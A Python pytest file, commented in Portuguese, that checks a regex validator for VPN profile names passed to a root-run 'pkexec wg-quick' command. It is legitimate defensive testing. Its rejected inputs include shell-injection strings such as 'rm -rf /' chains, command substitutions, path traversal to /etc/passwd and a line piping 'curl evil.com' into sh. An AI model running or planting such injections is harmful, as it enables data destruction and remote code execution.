"""Testes de validacao em vigia_vpn.backend.

Profile name vai pra `pkexec wg-quick up <name>` — shell injection
aqui significa rodar comando como root. CRITICO.
"""

from __future__ import annotations

import re

import pytest


# Replica regex do backend
PROFILE_NAME_REGEX = re.compile(r"^[a-zA-Z0-9._-]+$")


def is_valid_profile_name(name: str) -> bool:
    """Replica logica de connect_blocking/disconnect_blocking."""
    return bool(PROFILE_NAME_REGEX.match(name))


class TestValidNames:
    def test_simple(self):
        assert is_valid_profile_name("myvpn")

    def test_with_dot(self):
        assert is_valid_profile_name("my.vpn")

    def test_with_underscore(self):
        assert is_valid_profile_name("my_vpn")

    def test_with_hyphen(self):
        assert is_valid_profile_name("my-vpn")

    def test_with_numbers(self):
        assert is_valid_profile_name("vpn1234")

    def test_all_chars(self):
        assert is_valid_profile_name("aB3._-")


class TestInvalidNames:
    def test_empty(self):
        assert not is_valid_profile_name("")

    def test_space(self):
        assert not is_valid_profile_name("my vpn")

    def test_semicolon(self):
        """Shell injection: 'work; rm -rf /' viraria 2 comandos via wg-quick."""
        assert not is_valid_profile_name("work; rm -rf /")

    def test_dollar(self):
        assert not is_valid_profile_name("$(id)")

    def test_backtick(self):
        assert not is_valid_profile_name("`whoami`")

    def test_path_traversal(self):
        # ../ pra escapar de /etc/wireguard/
        assert not is_valid_profile_name("../etc/passwd")

    def test_slash(self):
        # Path slash nao deve passar
        assert not is_valid_profile_name("vpn/etc/passwd")

    def test_null(self):
        assert not is_valid_profile_name("\x00")

    def test_newline(self):
        assert not is_valid_profile_name("vpn\nrm -rf /")

    def test_special_chars(self):
        # Caracteres unicode/acentos nao aceitos
        assert not is_valid_profile_name("conexão")

    def test_quote(self):
        assert not is_valid_profile_name("vpn'name")

    def test_double_quote(self):
        assert not is_valid_profile_name('vpn"name')

    def test_glob(self):
        assert not is_valid_profile_name("vpn*")

    def test_brace(self):
        assert not is_valid_profile_name("vpn{evil}")


class TestRealAttacks:
    """Cenarios de ataque que JA aconteceram em wrappers similares."""

    def test_command_chain(self):
        # Tenta chain: encode shell command como nome
        assert not is_valid_profile_name("vpn && curl evil.com | sh")

    def test_subshell(self):
        assert not is_valid_profile_name("$(rm -rf /)")

    def test_unicode_homograph(self):
        # Cyrilic 'a' (U+0430) parece com 'a' — nao deve passar
        assert not is_valid_profile_name("аpp")

    def test_extremely_long_documenta_gap(self):
        """LIMITACAO conhecida: regex aceita strings arbitrariamente longas.

        100k 'a's passam pelo regex (todos chars validos). Backend deveria
        ter limite de comprimento explicito (~64 chars) como defense-in-depth.

        Fix sugerido em vpn-manager/backend.py:
            if len(profile_name) > 64:
                return False, "Nome muito longo"
        """
        # Documenta comportamento atual (passa regex)
        long_name = "a" * 100000
        passes_regex = is_valid_profile_name(long_name)
        # TODO: depois do fix, isto deve virar 'assert not passes_regex'
        assert passes_regex  # bug-by-design — regex sozinho nao limita
